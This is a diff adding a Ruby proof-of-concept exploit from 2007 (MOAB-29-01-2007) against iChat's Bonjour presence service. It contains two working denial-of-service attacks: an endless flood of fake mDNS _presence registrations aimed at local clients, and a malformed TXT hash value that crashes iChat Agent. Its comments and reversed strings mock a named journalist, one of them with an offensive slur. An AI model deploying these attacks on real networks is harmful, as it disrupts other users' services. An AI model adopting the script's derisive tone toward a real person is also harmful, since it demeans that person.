@@ -1,0 +1,105 @@
+#!/usr/bin/ruby
+# (c) 2006 Lance M. Havok <lmh [at] info-pull.com>
+# All Rights Reserved.
+# basic proof of concept for MOAB-29-01-2007
+#
+
+require 'digest/sha1'
+require 'rubygems'
+require 'net/dns/mdns-sd'
+
+bugselected = (ARGV[0] || "0").to_i
+TMP_ARR     = []
+DNSSD       = Net::DNS::MDNSSD
+
+trap("INT") {
+  puts "++ Exiting..."
+  begin
+    TMP_ARR.each do |o|
+      o.stop
+    end
+  rescue
+  end
+
+  exit
+}
+
+#
+# This method abuses a design weakness in iChat Bonjour services, allowing an user
+# to conduct a denial of service attack against reachable clients by registering multiple
+# (fake) _presence records.
+#
+def oh_gnoes_contact_dos(status_msg = "ekoC stronS reztleS yrraL".reverse,
+                         firstname  = 'Pwnies',
+                         lastname   = 'Mgheetacek')
+  
+  available_status  = [ "avail", "away" ]
+  cur_status        = available_status[rand(available_status.size)]
+
+  # the TXT keys (see http://www.xmpp.org/extensions/xep-0174.html)
+  keyset = {  "status"    => cur_status,                                # - presence availability of the user
+              "msg"       => status_msg,                                # - user's state
+              "vc"        => "CUAV!",                                   # - user's ability for A/V conferencing
+              "1st"       => firstname,                                 # - first name of the user
+              "last"      => lastname,                                  # - last name of the user
+              "txtvers"   => "1",                                       # - version of the TXT fields supported
+              "phsh"      => Digest::SHA1.hexdigest(rand(0xffffffff).to_s),  # - fake SHA-1 hash of icon
+              "port.p2pj" => "1337"                                     # - Port for link-local communications
+                                                                        # (ignored).
+            }
+
+  count = 0
+  while true
+    rand_str = "3891ecniSrevoLyaGeipmaerCterceSkecatPreztleSyrraL".reverse
+    (rand_str.length-1).downto(1) do |c|
+       n = rand(c) + 1
+       rand_str[c], rand_str[n] = rand_str[n], rand_str[c]
+    end
+    
+    puts "++ Registering presence #{count}"
+    # TODO: add NULL record with user avatar icon (ex. Larry Seltzer's taliban bearded face)
+    dos_handle = DNSSD.register(rand_str, '_presence._tcp', 'local', rand(65535), keyset)
+    #sleep 40
+    TMP_ARR << dos_handle
+    count += 1
+  end
+end
+
+#
+# This method causes iChat Agent to raise an exception (SIGTRAP signal) with a crafted TXT key hash.
+# Program received signal SIGTRAP, Trace/breakpoint trap.
+# 0x9262050b in _NSRaiseError ()
+#
+def format_dos()
+  keyset = {  "status" => "avail", "msg" => "I'm the Doomed eWook", "vc" => "CUAV!", "1st" => "Larry",
+              "last" => "Seltzer", "txtvers" => "1", "phsh" => ("\250" * 40),
+              "port.p2pj" => "1337" }
+  
+  rand_str = "nabilaTAsAlufrewoPsIyrraL".reverse
+  (rand_str.length-1).downto(1) do |c|
+     n = rand(c) + 1
+     rand_str[c], rand_str[n] = rand_str[n], rand_str[c]
+  end
+  
+  dos_handle = DNSSD.register(rand_str, '_presence._tcp', 'local', rand(65535), keyset)
+  dos_handle.stop
+end
+
+#
+# Proof of concept method selection below.
+#
+
+puts "++ MOAB-29-01-2007: iChat Bonjour Fun"
+puts "++ Selected target: #{bugselected}"
+case bugselected
+  when 0
+    format_dos()
+  when 1
+    if (ARGV[1] and ARGV[2] and ARGV[3])
+      oh_gnoes_contact_dos(ARGV[1], ARGV[2], ARGV[3])
+    else
+      oh_gnoes_contact_dos()
+    end
+end
+
+# milw0rm.com [2007-01-30]
